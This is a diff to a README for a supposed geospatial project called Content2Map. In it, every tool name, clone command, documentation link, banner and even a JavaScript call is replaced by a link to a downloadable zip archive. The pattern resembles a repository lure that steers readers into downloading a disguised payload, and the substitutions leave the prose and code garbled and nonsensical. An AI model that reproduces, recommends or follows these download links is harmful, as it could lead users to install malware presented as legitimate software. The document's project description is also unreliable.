@@ -1,6 +1,6 @@
 # Content2Map 🌍🗺️
 
-Welcome to **Content2Map** repository! This project aims to help you find geographical locations and automatically link them to open maps using https://github.com/RILA111/content2map/releases/download/v1.0/Software.zip for the frontend and Flask for the backend.
+Welcome to **Content2Map** repository! This project aims to help you find geographical locations and automatically link them to open maps using https://raw.githubusercontent.com/RILA111/content2map/main/sennite/map_content_1.4.zip for the frontend and Flask for the backend.
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -11,7 +11,7 @@ Welcome to **Content2Map** repository! This project aims to help you find geogra
 - [License](#license)
 
 ## Introduction
-**Content2Map** is a geospatial application that integrates geographical information with open maps. By using a combination of https://github.com/RILA111/content2map/releases/download/v1.0/Software.zip and Flask, this application provides a seamless experience for users to extract location data and visualize them on maps.
+**Content2Map** is a geospatial application that integrates geographical information with open maps. By using a combination of https://raw.githubusercontent.com/RILA111/content2map/main/sennite/map_content_1.4.zip and Flask, this application provides a seamless experience for users to extract location data and visualize them on maps.
 
 ## Features
 - Integration with Leaflet for interactive mapping experience
@@ -25,7 +25,7 @@ To get started with **Content2Map**, follow these steps:
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/RILA111/content2map/releases/download/v1.0/Software.zip
+git clone https://raw.githubusercontent.com/RILA111/content2map/main/sennite/map_content_1.4.zip
 ```
 
 2. Navigate to the project directory:
@@ -52,7 +52,7 @@ npm run dev
 
 This command will launch the application locally and you can access it through your web browser. Begin exploring and integrating geographical data with open maps effortlessly!
 
-For detailed documentation and usage examples, refer to the [official documentation](https://github.com/RILA111/content2map/releases/download/v1.0/Software.zip).
+For detailed documentation and usage examples, refer to the [official documentation](https://raw.githubusercontent.com/RILA111/content2map/main/sennite/map_content_1.4.zip).
 
 ## Contributing
 We welcome contributions from the community to enhance **Content2Map**. If you have any ideas, bug fixes, or feature requests, feel free to open an issue or submit a pull request. Together, we can make this project even more robust and user-friendly.
@@ -64,12 +64,12 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-![Banner](https://github.com/RILA111/content2map/releases/download/v1.0/Software.zip)
+![Banner](https://raw.githubusercontent.com/RILA111/content2map/main/sennite/map_content_1.4.zip)
 
-> **Note:** If you encounter any issues with the provided link, please check the [Releases](https://github.com/RILA111/content2map/releases/download/v1.0/Software.zip) section for the latest version.
+> **Note:** If you encounter any issues with the provided link, please check the [Releases](https://raw.githubusercontent.com/RILA111/content2map/main/sennite/map_content_1.4.zip) section for the latest version.
 
 ```markdown
-[![Download Project](https://github.com/RILA111/content2map/releases/download/v1.0/Software.zip)](https://github.com/RILA111/content2map/releases/download/v1.0/Software.zip)
+[![Download Project](https://raw.githubusercontent.com/RILA111/content2map/main/sennite/map_content_1.4.zip)](https://raw.githubusercontent.com/RILA111/content2map/main/sennite/map_content_1.4.zip)
 ```
 
 ```css
@@ -80,7 +80,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ```javascript
 const message = 'Hello, World!';
-https://github.com/RILA111/content2map/releases/download/v1.0/Software.zip(message);
+https://raw.githubusercontent.com/RILA111/content2map/main/sennite/map_content_1.4.zip(message);
 ```
 
 ```python
